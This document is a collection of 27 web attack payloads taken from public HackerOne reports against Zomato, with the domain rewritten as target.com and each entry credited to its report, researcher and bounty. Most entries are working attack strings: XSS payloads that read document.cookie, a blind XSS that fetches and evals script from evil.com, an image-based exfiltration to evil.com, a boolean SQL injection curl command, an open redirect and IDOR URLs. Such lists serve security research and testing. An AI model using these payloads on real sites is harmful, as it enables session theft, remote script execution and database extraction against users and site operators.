# Eternal

27 payloads.

### `a0f12fbe`

```
https://target.com/php/fb_login_pass_reset?type=%22%3E%3Csvg/onload=alert%28document.domain%29%3E%3Ch1%3EBoooooya!!%3C/h1%3E
```

**Parameter:** `type`
— [Cross Site Scripting - type Patameter](https://hackerone.com/reports/114151) · Eternal · [thsa](https://hackerone.com/thsa)

### `054fb83d`

```
"><"<img src="x">%20%20> "<iframe src=a>%20<iframe>
```

— [Persistent input validation mail encoding vulnerability  in the "just followed you" email notification.](https://hackerone.com/reports/114879) · Eternal · [pr0tagon1st](https://hackerone.com/pr0tagon1st)

### `85f3c429`

```
<img Src="http://target.com/JPx2sV" onload=alert("PENTEST")>%20%20> "<iframe Src=a>%20<iframe>
```

— [Persistent input validation mail encoding vulnerability  in the "just followed you" email notification.](https://hackerone.com/reports/114879) · Eternal · [pr0tagon1st](https://hackerone.com/pr0tagon1st)

### `8aa85c53`

```
<html>
    <body>
        <iframe src="https://target.com/widgets/res_search_widget.php?city_id=273&language_id=%22%7D%27)%3Balert(document.domain)%3Bconsole.log(%27&theme=blue&hideCitySearch=on&hideResSearch=on&sort=popularity" style="position:relative;width:100%;height:100%;" border="0" frameborder="0"></iframe>
    </body>
</html>
```

**Parameter:** `language_id`
— [XSS via modified Zomato widget (res_search_widget.php)](https://hackerone.com/reports/115402) · Eternal · [pr0tagon1st](https://hackerone.com/pr0tagon1st)

### `47b7d9a3`

```
"}');alert(document.domain);console.log('
```

**Parameter:** `language_id`
— [XSS via modified Zomato widget (res_search_widget.php)](https://hackerone.com/reports/115402) · Eternal · [pr0tagon1st](https://hackerone.com/pr0tagon1st)

### `881b7dce`

```
'-->">'>'"<script>prompt(document.domain)</script>;" f0r=TRUE
```

— [Reflected XSS on Zomato API](https://hackerone.com/reports/125762) · Eternal · [murat](https://hackerone.com/murat)

### `ddfea8f6`

```
https://target.com/php/instagram_tag_relay?callback=%3Cscript%3Ealert(document.domain)%3C/script%3E
```

**Parameter:** `callback`
— [Reflected Cross-Site Scripting in target.com/php/instagram_tag_relay](https://hackerone.com/reports/138262) · Eternal · [dejavuln](https://hackerone.com/dejavuln)

### `7b826531`

```
https://target.com/php/instagram_tag_relay?callback=><img+src%3dhttps%3a//evil.com/%3f
```

**Parameter:** `callback`
— [Reflected Cross-Site Scripting in target.com/php/instagram_tag_relay](https://hackerone.com/reports/138262) · Eternal · [dejavuln](https://hackerone.com/dejavuln)

### `847993a6`

```
https://target.com/redirect?u=http%3A%2F%2Fevil.com&t=38dc43d5f007f4c5d974f6c74f065158&g=user-profile-website
```

**Parameter:** `u`
— [Unvalidated redirect on user profile website](https://hackerone.com/reports/143265) · Eternal · [roshanpty](https://hackerone.com/roshanpty)

### `ba4c70d1`

```
javascript:eval%2528unescape%2528location.hash.slice%25281%2529%2529%2529
```

— [Outdated MediaElement.js Reflected Cross-Site Scripting (XSS)](https://hackerone.com/reports/155228) · Eternal · [mrtn](https://hackerone.com/mrtn)

### `e9d32f12`

```
"--><%2Fscript><svg%2Fonload%3D'%3Balert(document.domain)%3B'>
```

**Parameter:** `category`
— [Reflected XSS in Zomato Mobile - category parameter](https://hackerone.com/reports/230119) · Eternal · [harrymg](https://hackerone.com/harrymg)

### `5766418e`

```
curl -H 'Host: target.com' -H 'Cookie: PHPSESSID=XXXXX' 'https://target.com/████.php?entity_type=restaurant&entity_id=1+or+if(mid(@@version,1,1)=5,1,2)=2%23' -k
```

**Parameter:** `entity_id`
— [\[target.com\] Boolean SQLi - /█████.php](https://hackerone.com/reports/297534) · Eternal · [gerben_javado](https://hackerone.com/gerben_javado) · $1,000.0

### `b2cb2957`

```
if(mid(@@version,1,1)=5
```

— [\[target.com\] Boolean SQLi - /█████.php](https://hackerone.com/reports/297534) · Eternal · [gerben_javado](https://hackerone.com/gerben_javado) · $1,000.0

### `647cbddf`

```
if(mid(@@version,1,1)=4
```

— [\[target.com\] Boolean SQLi - /█████.php](https://hackerone.com/reports/297534) · Eternal · [gerben_javado](https://hackerone.com/gerben_javado) · $1,000.0

### `3235fd1a`

```
https://target.com/php/liveSuggest.php?type=keyword&search_bar=1&q=ad&online_ordering=&search_city_id=5&entity_id=confirm(1
```

**Parameter:** `entity_id`
— [target.com Reflected Cross Site Scripting](https://hackerone.com/reports/303522) · Eternal · [akamble937](https://hackerone.com/akamble937) · $100.0

### `9ab8a1b6`

```
<u>Reported by Merchant(ID)</u> : <a style="opacity: 1; color: #000000; text-decoration:underline" href="https://target.com/users/43211589">43211589</a><br><u>Report Reason ID</u> : 5 (Other (mention reason below).)<br><u>Additional Text</u> : H
H
H
H
H
''"&gt;<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//evil.com");a.send();</script>
```

**Parameter:** `additional_text`
— [Blind XSS - Report review - Admin panel](https://hackerone.com/reports/314126) · Eternal · [gerben_javado](https://hackerone.com/gerben_javado) · $350.0

### `460f71bd`

```
<script>history.pushState('', '', '/')</script>
```

— [\[Zomato's Blog\] POST based XSS on https://target.com/blog/wp-admin/admin-ajax.php?td_theme_name=Newspaper&v=8.2](https://hackerone.com/reports/335481) · Eternal · [inferno-](https://hackerone.com/inferno-) · $100.0

### `7cbd6cf6`

```
<input type="hidden" name="loopState&#91;moduleId&#93;" value="&lt;svg&gt;&lt;script&gt;prompt&amp;&#35;40&#59;document&#46;domain&#41;&lt;&#47;script&gt;" />
```

**Parameter:** `loopState[moduleId]`
— [\[Zomato's Blog\] POST based XSS on https://target.com/blog/wp-admin/admin-ajax.php?td_theme_name=Newspaper&v=8.2](https://hackerone.com/reports/335481) · Eternal · [inferno-](https://hackerone.com/inferno-) · $100.0

### `bdd7f3e7`

```
https://target.com/gold/payment-success?subscription_id=██████████&user_id=█████████
```

**Parameter:** `subscription_id`
— [\[target.com\] IDOR - Gold Subscription Details, Able to view "Membership ID" and "Validity Details" of other Users](https://hackerone.com/reports/344145) · Eternal · [riya](https://hackerone.com/riya) · $100.0

### `66e202d4`

```
"><script>alert(0);</script>
```

— [\[target.com\] Blind XSS in one of the Admin Dashboard](https://hackerone.com/reports/419731) · Eternal · [sandeep_hodkasia](https://hackerone.com/sandeep_hodkasia)

### `5a141aca`

```
<marquee loop%3d1 width%3d0 onfinish%3dco\u006efirm(document.cookie)>XSS<%2fmarquee>
```

**Parameter:** `error_hint`
— [\[target.com\] Reflected XSS at `oauth2/fallbacks/error` | ORY Hydra an OAuth 2.0 and OpenID Connect Provider](https://hackerone.com/reports/456333) · Eternal · [sudi](https://hackerone.com/sudi)

### `f82992b9`

```
https://target.com/oauth2/fallbacks/error?error=xss&error_description=xsssy&error_hint=%3Cmarquee%20loop%3d1%20width%3d0%20onfinish%3dco\u006efirm(document.cookie)%3EXSS%3C%2fmarquee%3E
```

**Parameter:** `error_hint`
— [\[target.com\] Reflected XSS at `oauth2/fallbacks/error` | ORY Hydra an OAuth 2.0 and OpenID Connect Provider](https://hackerone.com/reports/456333) · Eternal · [sudi](https://hackerone.com/sudi)

### `260c6918`

```
Post data: "><img src="                    >/zomato.php?c=zomato_xss" />
```

— [\[target.com\] Blind XSS in one of the admin dashboard](https://hackerone.com/reports/461272) · Eternal · [nguyenlv7](https://hackerone.com/nguyenlv7) · $500.0

### `1ce2843f`

```
review=140 characters long review&
review_db=140 characters long review&
with_tags_data=<script>prompt(0,document.domain)</script>&
res_id=19132208&
city_id=11333&
rating=5&
is_edit=0&
review_id=0&
save_image=1&
instagram_images_to_update=[]&
instagram_json_data={"data":[]}&
uploaded_images_json=[]&
share_to_fb=false&
share_to_tw=false&
snippet=restaurant-review&
web_source=default&
csrf_token=2acad4ba08d4000000000007923a25d&
external_url=
```

**Parameter:** `with_tags_data`
— [Self-Stored XSS - Chained with login/logout CSRF](https://hackerone.com/reports/632017) · Eternal · [madguyyy](https://hackerone.com/madguyyy) · $300.0

### `4da968bd`

```
"><details onauxclick=x=prompt,x`${document.cookie}`></details>
```

— [HTML Injection @ /\[restaurant\]/order endpoint.](https://hackerone.com/reports/738810) · Eternal · [mr_edwards](https://hackerone.com/mr_edwards) · $150.0

### `bd8fbf95`

```
"><marquee+width=1000+onauxclick=confirm(document.cookie)>XSS</marquee>
```

— [HTML Injection @ /\[restaurant\]/order endpoint.](https://hackerone.com/reports/738810) · Eternal · [mr_edwards](https://hackerone.com/mr_edwards) · $150.0

### `5b1dae66`

```
"><svg height="1000" width="1000" onauxclick=confirm`12233`> <circle cx="500" cy="500" r="400" stroke="black" stroke-width="3" fill="red" /> </svg>
```

— [HTML injection leads to reflected XSS](https://hackerone.com/reports/743345) · Eternal · [haxor5392](https://hackerone.com/haxor5392) · $150.0
